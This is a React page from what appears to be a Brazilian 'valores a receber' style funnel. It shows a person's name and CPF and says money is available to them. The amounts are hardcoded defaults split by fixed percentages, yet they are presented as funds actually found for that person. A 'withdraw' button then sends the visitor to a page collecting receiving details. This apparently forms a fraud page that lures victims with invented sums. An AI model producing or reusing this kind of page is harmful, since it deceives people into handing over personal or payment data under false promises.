import { useEffect } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { ArrowRight } from 'lucide-react';
import Header from '../components/Header';
import Footer from '../components/Footer';
import { navigateWithParams } from '../utils/urlParams';
import { saveFunnelData, getFunnelData } from '../utils/funnelStorage';

export default function AvailableValuesPage() {
  const navigate = useNavigate();
  const location = useLocation();
  const funnelData = getFunnelData();
  const { userData: stateUserData, indemnityAmount: stateIndemnityAmount = 5960.50, urlParams } = location.state || {};
  const userData = stateUserData || funnelData.userData;
  const indemnityAmount = stateIndemnityAmount || 7854.63;

  useEffect(() => {
    if (!userData) {
      navigate('/');
      return;
    }

    saveFunnelData({
      userData: userData,
      currentStep: '/valores-disponiveis'
    });
  }, [navigate, userData]);

  if (!userData) {
    return null;
  }

  const firstName = userData.nome.split(' ')[0];
  const formattedCPF = userData.cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');

  const values = {
    total: indemnityAmount,
    banks: indemnityAmount * 0.36,
    restitutions: indemnityAmount * 0.30,
    companies: indemnityAmount * 0.34
  };

  const formatCurrency = (value: number) => {
    return value.toLocaleString('pt-BR', {
      minimumFractionDigits: 2,
      maximumFractionDigits: 2
    });
  };

  const handleContinue = () => {
    navigateWithParams(
      navigate,
      '/dados-recebimento',
      location,
      {
        userData,
        indemnityAmount: values.total
      }
    );
  };

  return (
    <div className="min-h-screen bg-[#f4f4f4] flex flex-col">
      <Header />

      <main className="flex-1 flex items-center justify-center p-4 sm:p-6 md:p-8 pt-24 sm:pt-28 pb-20">
        <div className="w-full max-w-sm sm:max-w-md lg:max-w-lg">
          <div className="animate-scale-in">
            <div className="text-center mb-6 sm:mb-8 animate-fade-in-down">
              <h1 className="text-xl sm:text-2xl md:text-3xl font-semibold text-gray-900 mb-2 sm:mb-3 px-2">
                {firstName}, encontramos valores disponíveis
              </h1>
              <p className="text-xs sm:text-sm text-gray-600">
                CPF: {formattedCPF}
              </p>
            </div>

            <div className="bg-gradient-to-br from-purple-600 to-purple-700 rounded-lg p-5 sm:p-6 md:p-8 mb-5 sm:mb-6 shadow-md animate-slide-up">
              <div className="text-center mb-5 sm:mb-6 animate-bounce-in">
                <p className="text-purple-100 text-xs sm:text-sm font-medium mb-2 sm:mb-3">
                  VALOR TOTAL DISPONÍVEL
                </p>
                <p className="text-white text-3xl sm:text-4xl md:text-5xl font-semibold break-words">
                  R$ {formatCurrency(values.total)}
                </p>
              </div>

              <div className="space-y-2 sm:space-y-3 animate-stagger">
                <div className="bg-purple-500/30 backdrop-blur-sm rounded-xl p-3 sm:p-4 flex items-center justify-between gap-2">
                  <span className="text-white text-xs sm:text-sm font-medium truncate">
                    Valores em bancos
                  </span>
                  <span className="text-white text-sm sm:text-base md:text-lg font-semibold whitespace-nowrap">
                    R$ {formatCurrency(values.banks)}
                  </span>
                </div>

                <div className="bg-purple-500/30 backdrop-blur-sm rounded-xl p-3 sm:p-4 flex items-center justify-between gap-2">
                  <span className="text-white text-xs sm:text-sm font-medium truncate">
                    Restituições
                  </span>
                  <span className="text-white text-sm sm:text-base md:text-lg font-semibold whitespace-nowrap">
                    R$ {formatCurrency(values.restitutions)}
                  </span>
                </div>

                <div className="bg-purple-500/30 backdrop-blur-sm rounded-xl p-3 sm:p-4 flex items-center justify-between gap-2">
                  <span className="text-white text-xs sm:text-sm font-medium truncate">
                    Empresas
                  </span>
                  <span className="text-white text-sm sm:text-base md:text-lg font-semibold whitespace-nowrap">
                    R$ {formatCurrency(values.companies)}
                  </span>
                </div>
              </div>
            </div>


            <button
              onClick={handleContinue}
              className="w-full bg-purple-600 hover:bg-purple-700 text-white font-semibold py-3 sm:py-4 px-6 rounded-xl transition-all duration-200 shadow-md flex items-center justify-center group text-sm sm:text-base animate-slide-up-delayed"
            >
              Efetuar Saque
              <ArrowRight className="ml-2 w-4 h-4 sm:w-5 sm:h-5 group-hover:translate-x-1 transition-transform" />
            </button>
          </div>
        </div>
      </main>

      <Footer />

      <style>{`
        @keyframes scale-in {
          from {
            opacity: 0;
            transform: scale(0.95);
          }
          to {
            opacity: 1;
            transform: scale(1);
          }
        }
        .animate-scale-in {
          animation: scale-in 0.4s ease-out;
        }

        @keyframes fade-in-down {
          from {
            opacity: 0;
            transform: translateY(-15px);
          }
          to {
            opacity: 1;
            transform: translateY(0);
          }
        }
        .animate-fade-in-down {
          animation: fade-in-down 0.5s ease-out 0.2s backwards;
        }

        @keyframes slide-up {
          from {
            opacity: 0;
            transform: translateY(30px);
          }
          to {
            opacity: 1;
            transform: translateY(0);
          }
        }
        .animate-slide-up {
          animation: slide-up 0.6s ease-out 0.3s backwards;
        }

        .animate-slide-up-delayed {
          animation: slide-up 0.5s ease-out 0.5s backwards;
        }

        .animate-slide-up-delayed-2 {
          animation: slide-up 0.5s ease-out 0.6s backwards;
        }

        @keyframes bounce-in {
          0% {
            opacity: 0;
            transform: scale(0.8);
          }
          50% {
            transform: scale(1.05);
          }
          100% {
            opacity: 1;
            transform: scale(1);
          }
        }
        .animate-bounce-in {
          animation: bounce-in 0.6s cubic-bezier(0.34, 1.56, 0.64, 1) 0.4s backwards;
        }

        @keyframes stagger {
          from {
            opacity: 0;
          }
          to {
            opacity: 1;
          }
        }
        .animate-stagger {
          animation: stagger 0.5s ease-out 0.5s backwards;
        }
      `}</style>
    </div>
  );
}
